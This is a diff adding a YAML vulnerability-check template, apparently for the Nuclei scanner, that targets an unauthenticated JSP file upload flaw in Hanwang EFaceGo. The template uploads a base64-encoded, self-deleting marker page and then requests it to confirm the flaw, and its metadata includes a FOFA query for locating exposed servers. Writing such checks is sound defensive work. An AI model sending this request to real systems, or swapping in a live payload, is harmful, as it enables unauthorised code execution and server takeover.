@@ -1,0 +1,48 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([a-zA-Z0-9-]+\.jsp)
+          type: regex
+      raw:
+        - |
+          POST /manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+          Content-Type: application/json
+
+          {
+            "id": 1,
+            "mapName": "{{username}}",
+            "fileType": "jsp",
+            "updatedPhoto": "PCUgb3V0LnByaW50bG4oInBib3lqbm5yZmlwbXBsc3VrZGVjenVkc2VmeG15d2UiKTsgbmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT4="
+          }
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /manage/resource/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: hanwangEFaceGo-updateVisitorMapConfig_do-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: icon_hash="1380907357"
+        汉王EFaceGo updateVisitorMapConfig.do 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 汉王EFaceGo updateVisitorMapConfig.do 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/mFJpbHdr7CMglYNOB-Gpiw
+    severity: high
+    tags: []
+variables:
+    username: '{{to_lower(rand_base(6))}}'
